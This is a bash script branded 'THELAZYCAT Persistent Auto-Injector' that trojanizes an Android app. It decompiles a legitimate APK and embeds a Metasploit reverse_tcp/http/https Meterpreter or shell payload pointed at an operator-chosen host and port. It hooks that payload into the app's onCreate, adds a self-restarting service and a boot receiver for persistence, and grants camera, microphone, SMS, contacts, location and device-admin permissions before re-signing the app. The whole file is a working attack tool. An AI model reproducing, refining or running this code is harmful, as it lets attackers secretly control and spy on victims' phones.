#!/bin/bash
clear
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
CYAN='\033[0;36m'
NC='\033[0m'

echo -e "${BLUE}"
echo "╔════════════════════════════════════════════════╗"
echo "║                   THELAZYCAT                   ║"
echo "║           Persistent Auto-Injector v4.2        ║"
echo "║                 Created by N3L                 ║"
echo "║      GitHub: https://github.com/n31nym0u2      ║"
echo "╚════════════════════════════════════════════════╝"
echo -e "${NC}"

show_loading() {
    local pid=$1
    local text="$2"
    local spin='⣷⣯⣟⡿⢿⣻⣽⣾'
    local i=0
    
    while kill -0 $pid 2>/dev/null; do
        i=$(( (i+1) % 8 ))
        printf "\r${CYAN}[${spin:$i:1}]${NC} $text..."
        sleep 0.1
    done
    printf "\r${GREEN}[✓]${NC} $text completed\n"
}

cleanup() {
    echo -e "${YELLOW}[+] Cleaning temporary files...${NC}"
    rm -rf decoded_app decoded_payload payload.apk /tmp/android_inject_* thelazycat.keystore 2>/dev/null
}

error_exit() {
    echo -e "${RED}[-] ERROR: $1${NC}"
    cleanup
    exit 1
}

trap cleanup EXIT

echo -e "${YELLOW}[+] Tool Check...${NC}"

check_tool() {
    if command -v "$1" >/dev/null 2>&1; then
        echo -e "${GREEN}[✓] $1${NC}"
        return 0
    else
        echo -e "${RED}[✗] $1${NC}"
        return 1
    fi
}

ESSENTIAL_TOOLS="apktool msfvenom keytool jarsigner"
MISSING_ESSENTIAL=0

for tool in $ESSENTIAL_TOOLS; do
    if ! check_tool "$tool"; then
        MISSING_ESSENTIAL=$((MISSING_ESSENTIAL + 1))
    fi
done

if [ $MISSING_ESSENTIAL -ne 0 ]; then
    echo -e "${RED}[-] Missing essential tools. Install with: sudo apt install apktool metasploit-framework default-jdk${NC}"
    exit 1
fi

echo -e "${YELLOW}[+] Configuration Setup${NC}"

printf "Enter ORIGINAL_APK [Original.apk]: "
read ORIGINAL_APK
ORIGINAL_APK=${ORIGINAL_APK:-Original.apk}

printf "Enter OUTPUT_APK [persistent_app.apk]: "
read OUTPUT_APK
OUTPUT_APK=${OUTPUT_APK:-persistent_app.apk}

# Payload type selection
echo -e "${YELLOW}[+] Payload Type Selection${NC}"
echo -e "${BLUE}[1] android/meterpreter/reverse_tcp (Default)${NC}"
echo -e "${BLUE}[2] android/meterpreter/reverse_http${NC}"
echo -e "${BLUE}[3] android/meterpreter/reverse_https${NC}"
echo -e "${BLUE}[4] android/shell/reverse_tcp${NC}"
echo -e "${BLUE}[5] android/shell/reverse_http${NC}"
printf "Choose payload type [1]: "
read PAYLOAD_CHOICE
PAYLOAD_CHOICE=${PAYLOAD_CHOICE:-1}

case $PAYLOAD_CHOICE in
    1)
        PAYLOAD="android/meterpreter/reverse_tcp"
        ;;
    2)
        PAYLOAD="android/meterpreter/reverse_http"
        ;;
    3)
        PAYLOAD="android/meterpreter/reverse_https"
        ;;
    4)
        PAYLOAD="android/shell/reverse_tcp"
        ;;
    5)
        PAYLOAD="android/shell/reverse_http"
        ;;
    *)
        PAYLOAD="android/meterpreter/reverse_tcp"
        ;;
esac

echo -e "${GREEN}[+] Selected payload: $PAYLOAD${NC}"

while true; do
    printf "Enter LHOST (your IP/hostname): "
    read LHOST
    if [ -n "$LHOST" ]; then
        break
    else
        echo -e "${RED}[-] LHOST cannot be empty!${NC}"
    fi
done

while true; do
    printf "Enter LPORT: "
    read LPORT
    if [ -n "$LPORT" ]; then
        break
    else
        echo -e "${RED}[-] LPORT cannot be empty!${NC}"
    fi
done

printf "Enter keystore validity in days [3]: "
read VALIDITY_DAYS
VALIDITY_DAYS=${VALIDITY_DAYS:-3}

KEYSTORE="thelazycat.keystore"
ALIAS="thelazycat"
STOREPASS="password"
KEYPASS="password"

if [ ! -f "$ORIGINAL_APK" ]; then
    echo -e "${RED}[-] APK not found: $ORIGINAL_APK${NC}"
    ls -la *.apk 2>/dev/null || echo "No APK files"
    exit 1
fi

echo -e "${YELLOW}[+] Advanced Persistence Setup${NC}"
echo -e "${BLUE}Configuring 24/7 reverse connection capabilities...${NC}"

echo -e "${YELLOW}[+] Permission Selection${NC}"

DEFAULT_PERMISSIONS="android.permission.INTERNET android.permission.ACCESS_NETWORK_STATE android.permission.ACCESS_WIFI_STATE android.permission.WAKE_LOCK android.permission.FOREGROUND_SERVICE android.permission.RECEIVE_BOOT_COMPLETED android.permission.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS"

EXTRA_PERMISSIONS="android.permission.CAMERA android.permission.RECORD_AUDIO android.permission.READ_CONTACTS android.permission.WRITE_CONTACTS android.permission.READ_PHONE_STATE android.permission.CALL_PHONE android.permission.READ_SMS android.permission.SEND_SMS android.permission.RECEIVE_SMS android.permission.READ_EXTERNAL_STORAGE android.permission.WRITE_EXTERNAL_STORAGE android.permission.ACCESS_FINE_LOCATION android.permission.ACCESS_COARSE_LOCATION android.permission.ACCESS_BACKGROUND_LOCATION android.permission.SYSTEM_ALERT_WINDOW android.permission.BIND_DEVICE_ADMIN android.permission.READ_CALL_LOG android.permission.WRITE_CALL_LOG android.permission.PROCESS_OUTGOING_CALLS android.permission.ACCESS_CONTENT_PROVIDERS_EXTERNALLY"

echo -e "${BLUE}[1] Default Persistence Permissions${NC}"
echo -e "${BLUE}[2] Custom Permissions${NC}"
echo -e "${BLUE}[3] Full Control Permissions${NC}"
printf "Choose permission mode [1]: "
read PERM_MODE
PERM_MODE=${PERM_MODE:-1}

case $PERM_MODE in
    1)
        SELECTED_PERMISSIONS="$DEFAULT_PERMISSIONS"
        ;;
    2)
        echo -e "${YELLOW}Available Permissions:${NC}"
        i=1
        for perm in $EXTRA_PERMISSIONS; do
            echo "[$i] $perm"
            i=$((i + 1))
        done
        printf "Enter permission numbers (comma separated) [1,2,3]: "
        read PERM_NUMBERS
        PERM_NUMBERS=${PERM_NUMBERS:-1,2,3}
        
        SELECTED_PERMISSIONS="$DEFAULT_PERMISSIONS"
        IFS=',' read -ra CHOSEN <<< "$PERM_NUMBERS"
        for num in "${CHOSEN[@]}"; do
            index=$((num - 1))
            count=0
            for perm in $EXTRA_PERMISSIONS; do
                if [ $count -eq $index ]; then
                    SELECTED_PERMISSIONS="$SELECTED_PERMISSIONS $perm"
                    break
                fi
                count=$((count + 1))
            done
        done
        ;;
    3)
        SELECTED_PERMISSIONS="$DEFAULT_PERMISSIONS $EXTRA_PERMISSIONS"
        ;;
    *)
        SELECTED_PERMISSIONS="$DEFAULT_PERMISSIONS"
        ;;
esac

perm_count=$(echo "$SELECTED_PERMISSIONS" | wc -w)
echo -e "${GREEN}[+] Selected $perm_count permissions${NC}"

echo -e "${YELLOW}[+] Starting Persistent Injection Process${NC}"

cleanup

echo -e "${BLUE}[+] Decompiling original APK...${NC}"
(apktool d -f "$ORIGINAL_APK" -o decoded_app > /tmp/apktool_log 2>&1) &
APKTOOL_PID=$!
show_loading $APKTOOL_PID "Decompiling original APK"
if wait $APKTOOL_PID; then
    echo -e "${GREEN}[+] Original APK decompiled successfully${NC}"
else
    error_exit "Decompile failed"
fi

echo -e "${BLUE}[+] Generating persistent payload with LHOST=$LHOST LPORT=$LPORT...${NC}"
echo -e "${GREEN}[+] Payload: $PAYLOAD${NC}"
(msfvenom -p $PAYLOAD LHOST=$LHOST LPORT=$LPORT -o payload.apk > /tmp/msfvenom_log 2>&1) &
MSFVENOM_PID=$!
show_loading $MSFVENOM_PID "Generating persistent payload"
if wait $MSFVENOM_PID; then
    echo -e "${GREEN}[+] Persistent payload generated successfully${NC}"
else
    echo -e "${RED}[-] Payload generation failed. Check the log:${NC}"
    cat /tmp/msfvenom_log
    error_exit "Payload generation failed"
fi

echo -e "${BLUE}[+] Decompiling payload...${NC}"
(apktool d -f payload.apk -o decoded_payload > /tmp/payload_decompile_log 2>&1) &
PAYLOAD_DECOMPILE_PID=$!
show_loading $PAYLOAD_DECOMPILE_PID "Decompiling payload"
if wait $PAYLOAD_DECOMPILE_PID; then
    echo -e "${GREEN}[+] Payload decompiled successfully${NC}"
else
    error_exit "Payload decompile failed"
fi

echo -e "${BLUE}[+] Adding persistence permissions...${NC}"
for perm in $SELECTED_PERMISSIONS; do
    if ! grep -q "$perm" "decoded_app/AndroidManifest.xml"; then
        sed -i "/<manifest>/a \    <uses-permission android:name=\"$perm\" />" decoded_app/AndroidManifest.xml
        echo -e "${GREEN}[+] $perm${NC}"
    fi
done

echo -e "${BLUE}[+] Injecting payload components...${NC}"

# Create directory if it doesn't exist
mkdir -p "decoded_app/smali/com/metasploit/stage/"
cp -r decoded_payload/smali/com/metasploit/stage/* decoded_app/smali/com/metasploit/stage/ 2>/dev/null || echo -e "${YELLOW}[-] No stage directory in payload, continuing...${NC}"

# Improved main activity detection
echo -e "${BLUE}[+] Detecting main activity...${NC}"
PACKAGE_NAME=$(grep -oP 'package="\K[^"]*' decoded_app/AndroidManifest.xml | head -1)
echo -e "${BLUE}[+] Package name: $PACKAGE_NAME${NC}"

# Method 1: Find activity with MAIN and LAUNCHER intent
MAIN_ACTIVITY=$(grep -A 20 "android.intent.action.MAIN" decoded_app/AndroidManifest.xml | grep -B 20 "android.intent.category.LAUNCHER" | grep -oP '<activity[^>]*android:name="\K[^"]*' | head -1)

# Method 2: Find first activity if method 1 fails
if [ -z "$MAIN_ACTIVITY" ]; then
    MAIN_ACTIVITY=$(grep -oP '<activity[^>]*android:name="\K[^"]*' decoded_app/AndroidManifest.xml | head -1)
fi

# Handle relative activity names (starting with .)
if [[ "$MAIN_ACTIVITY" == .* ]]; then
    MAIN_ACTIVITY="${PACKAGE_NAME}${MAIN_ACTIVITY}"
fi

if [ -n "$MAIN_ACTIVITY" ]; then
    echo -e "${GREEN}[+] Main activity found: $MAIN_ACTIVITY${NC}"
    
    # Convert to file path
    MAIN_ACTIVITY_PATH=$(echo "$MAIN_ACTIVITY" | sed 's/\./\//g')
    echo -e "${BLUE}[+] Looking for activity file: $MAIN_ACTIVITY_PATH.smali${NC}"
    
    # Search for the activity file in all smali directories
    MAIN_ACTIVITY_FILE=""
    for smali_dir in decoded_app/smali*; do
        potential_file="$smali_dir/${MAIN_ACTIVITY_PATH}.smali"
        if [ -f "$potential_file" ]; then
            MAIN_ACTIVITY_FILE="$potential_file"
            echo -e "${GREEN}[+] Found main activity file: $MAIN_ACTIVITY_FILE${NC}"
            break
        fi
    done
    
    # Improved activity injection
    if [ -n "$MAIN_ACTIVITY_FILE" ] && [ -f "$MAIN_ACTIVITY_FILE" ]; then
        echo -e "${BLUE}[+] Injecting payload starter in main activity...${NC}"
        
        # Backup the original file
        cp "$MAIN_ACTIVITY_FILE" "${MAIN_ACTIVITY_FILE}.backup"
        
        # Check if injection already exists
        if grep -q "com/metasploit/stage/Payload" "$MAIN_ACTIVITY_FILE"; then
            echo -e "${YELLOW}[-] Payload already injected in main activity${NC}"
        else
            # Better injection method - find onCreate and inject after super call
            if grep -q "\.method.*onCreate" "$MAIN_ACTIVITY_FILE"; then
                echo -e "${GREEN}[+] Injecting into onCreate method...${NC}"
                
                # Create a temporary file for the modified content
                temp_file=$(mktemp)
                
                # Use awk to properly inject after invoke-super in onCreate
                awk '
                /\.method.*onCreate/,/\.end method/ {
                    print $0
                    if (/invoke-super.*onCreate/ && !injected) {
                        print "    invoke-static {p0}, Lcom/metasploit/stage/Payload;->start(Landroid/content/Context;)V"
                        injected=1
                    }
                    next
                }
                { print $0 }
                ' "$MAIN_ACTIVITY_FILE" > "$temp_file"
                
                mv "$temp_file" "$MAIN_ACTIVITY_FILE"
                
                # Verify injection
                if grep -q "com/metasploit/stage/Payload" "$MAIN_ACTIVITY_FILE"; then
                    echo -e "${GREEN}[+] Payload injection successful${NC}"
                else
                    echo -e "${YELLOW}[-] Standard injection failed, trying alternative method...${NC}"
                    # Alternative injection at the beginning of onCreate
                    sed -i '/\.method.*onCreate/,/\.locals/{/\.locals/a\    invoke-static {p0}, Lcom/metasploit/stage/Payload;->start(Landroid/content/Context;)V}' "$MAIN_ACTIVITY_FILE"
                fi
            else
                echo -e "${YELLOW}[-] No onCreate method found, adding static initializer...${NC}"
                # Add static initializer as fallback
                sed -i '/\.class.*/a\
.method static constructor <clinit>()V\
    .registers 0\
    invoke-static {}, Lcom/metasploit/stage/Payload;->start()V\
    return-void\
.end method' "$MAIN_ACTIVITY_FILE"
            fi
        fi
    else
        echo -e "${YELLOW}[-] Could not find main activity file, using service-only persistence${NC}"
    fi
else
    echo -e "${YELLOW}[-] No main activity found, using service-only persistence${NC}"
fi

echo -e "${BLUE}[+] Adding persistence components...${NC}"

# Correct service and receiver injection with proper package names
if ! grep -q "com.metasploit.stage.PersistentService" "decoded_app/AndroidManifest.xml"; then
    sed -i '/<application>/a\        <service android:name="com.metasploit.stage.PersistentService" android:enabled="true" android:exported="false" />' decoded_app/AndroidManifest.xml
fi

if ! grep -q "com.metasploit.stage.BootReceiver" "decoded_app/AndroidManifest.xml"; then
    sed -i '/<application>/a\        <receiver android:name="com.metasploit.stage.BootReceiver" android:enabled="true" android:exported="true">\n            <intent-filter>\n                <action android:name="android.intent.action.BOOT_COMPLETED" />\n                <action android:name="android.intent.action.QUICKBOOT_POWERON" />\n            </intent-filter>\n        </receiver>' decoded_app/AndroidManifest.xml
fi

# Create persistence service with proper syntax
cat > "decoded_app/smali/com/metasploit/stage/PersistentService.smali" << 'EOF'
.class public Lcom/metasploit/stage/PersistentService;
.super Landroid/app/Service;


# direct methods
.method public constructor <init>()V
    .registers 1

    .prologue
    .line 8
    invoke-direct {p0}, Landroid/app/Service;-><init>()V

    return-void
.end method


# virtual methods
.method public onBind(Landroid/content/Intent;)Landroid/os/IBinder;
    .registers 3

    .prologue
    .line 28
    const/4 v0, 0x0

    return-object v0
.end method

.method public onCreate()V
    .registers 1

    .prologue
    .line 12
    invoke-super {p0}, Landroid/app/Service;->onCreate()V

    .line 13
    return-void
.end method

.method public onDestroy()V
    .registers 3

    .prologue
    .line 22
    new-instance v0, Landroid/content/Intent;

    const-class v1, Lcom/metasploit/stage/PersistentService;

    invoke-direct {v0, p0, v1}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    invoke-virtual {p0, v0}, Lcom/metasploit/stage/PersistentService;->startService(Landroid/content/Intent;)Landroid/content/ComponentName;

    .line 23
    invoke-super {p0}, Landroid/app/Service;->onDestroy()V

    .line 24
    return-void
.end method

.method public onStartCommand(Landroid/content/Intent;II)I
    .registers 5

    .prologue
    .line 17
    invoke-static {p0}, Lcom/metasploit/stage/Payload;->start(Landroid/content/Context;)V

    .line 18
    const/4 v0, 0x1

    return v0
.end method
EOF

# Create boot receiver with proper syntax
cat > "decoded_app/smali/com/metasploit/stage/BootReceiver.smali" << 'EOF'
.class public Lcom/metasploit/stage/BootReceiver;
.super Landroid/content/BroadcastReceiver;


# direct methods
.method public constructor <init>()V
    .registers 1

    .prologue
    .line 8
    invoke-direct {p0}, Landroid/content/BroadcastReceiver;-><init>()V

    return-void
.end method


# virtual methods
.method public onReceive(Landroid/content/Context;Landroid/content/Intent;)V
    .registers 5

    .prologue
    .line 12
    new-instance v0, Landroid/content/Intent;

    const-class v1, Lcom/metasploit/stage/PersistentService;

    invoke-direct {v0, p1, v1}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    .line 13
    invoke-virtual {p1, v0}, Landroid/content/Context;->startService(Landroid/content/Intent;)Landroid/content/ComponentName;

    .line 14
    return-void
.end method
EOF

echo -e "${BLUE}[+] Building persistent APK...${NC}"
(apktool b decoded_app -o "$OUTPUT_APK" > /tmp/build_log 2>&1) &
BUILD_PID=$!
show_loading $BUILD_PID "Building persistent APK"
if wait $BUILD_PID; then
    echo -e "${GREEN}[+] Persistent APK built successfully${NC}"
else
    echo -e "${RED}[-] Build failed. Check the log:${NC}"
    cat /tmp/build_log
    error_exit "Build failed"
fi

echo -e "${BLUE}[+] Signing APK...${NC}"
rm -f "$KEYSTORE" 2>/dev/null

(keytool -genkey -v -keystore "$KEYSTORE" -alias "$ALIAS" -keyalg RSA -keysize 2048 -validity "$VALIDITY_DAYS" -storepass "$STOREPASS" -keypass "$KEYPASS" -dname "CN=THELAZYCAT, OU=Android, O=THELAZYCAT, L=Unknown, ST=Unknown, C=US" > /tmp/keystore_log 2>&1) &
KEYTOOL_PID=$!
show_loading $KEYTOOL_PID "Generating keystore"
if wait $KEYTOOL_PID; then
    echo -e "${GREEN}[+] Keystore generated successfully${NC}"
else
    error_exit "Keystore creation failed"
fi

(jarsigner -sigalg SHA1withRSA -digestalg SHA1 -keystore "$KEYSTORE" -storepass "$STOREPASS" -keypass "$KEYPASS" "$OUTPUT_APK" "$ALIAS" > /tmp/signing_log 2>&1) &
SIGNING_PID=$!
show_loading $SIGNING_PID "Signing APK"
if wait $SIGNING_PID; then
    echo -e "${GREEN}[+] APK signed successfully${NC}"
else
    error_exit "Signing failed"
fi

# Add zipalign step for better compatibility
if command -v zipalign >/dev/null 2>&1; then
    echo -e "${BLUE}[+] Optimizing APK with zipalign...${NC}"
    (zipalign -f 4 "$OUTPUT_APK" "${OUTPUT_APK}.aligned" && mv "${OUTPUT_APK}.aligned" "$OUTPUT_APK" > /tmp/zipalign_log 2>&1) &
    ZIPALIGN_PID=$!
    show_loading $ZIPALIGN_PID "Optimizing APK"
    if wait $ZIPALIGN_PID; then
        echo -e "${GREEN}[+] APK optimized successfully${NC}"
    else
        echo -e "${YELLOW}[-] Zipalign failed, but APK is still usable${NC}"
    fi
else
    echo -e "${YELLOW}[-] zipalign not found, skipping optimization${NC}"
fi

clear
if [ -f "$OUTPUT_APK" ]; then
    echo -e "${GREEN}"
    echo "╔════════════════════════════════════════════════╗"
    echo "║           PERSISTENT INJECTION SUCCESS!        ║"
    echo "╚════════════════════════════════════════════════╝"
    echo -e "${NC}"
    
    echo -e "${BLUE}[+] Injection Summary:${NC}"
    echo -e "Original: $ORIGINAL_APK"
    echo -e "Output: $OUTPUT_APK"
    echo -e "Payload: $PAYLOAD"
    echo -e "LHOST: $LHOST"
    echo -e "LPORT: $LPORT"
    echo -e "Package: $PACKAGE_NAME"
    
    if [ -n "$MAIN_ACTIVITY" ]; then
        echo -e "Main Activity: $MAIN_ACTIVITY"
        if [ -f "$MAIN_ACTIVITY_FILE" ] && grep -q "com/metasploit/stage/Payload" "$MAIN_ACTIVITY_FILE"; then
            echo -e "Main Activity Injection: ${GREEN}SUCCESS${NC}"
        else
            echo -e "Main Activity Injection: ${YELLOW}FAILED (using service persistence)${NC}"
        fi
    else
        echo -e "Main Activity: ${YELLOW}NOT FOUND (using service persistence)${NC}"
    fi
    
    OUTPUT_SIZE=$(du -h "$OUTPUT_APK" | cut -f1)
    echo -e "Output Size: $OUTPUT_SIZE"
    
    echo -e "${GREEN}[+] Persistent APK created successfully: $OUTPUT_APK${NC}"
    
    # Clean up temporary files
    echo -e "${YELLOW}[+] Cleaning up temporary files...${NC}"
    rm -rf decoded_app decoded_payload payload.apk thelazycat.keystore 2>/dev/null
    echo -e "${GREEN}[+] Cleanup completed${NC}"
    
else
    error_exit "Final APK not created"
fi

# Remove trap to prevent cleanup from running again
trap - EXIT
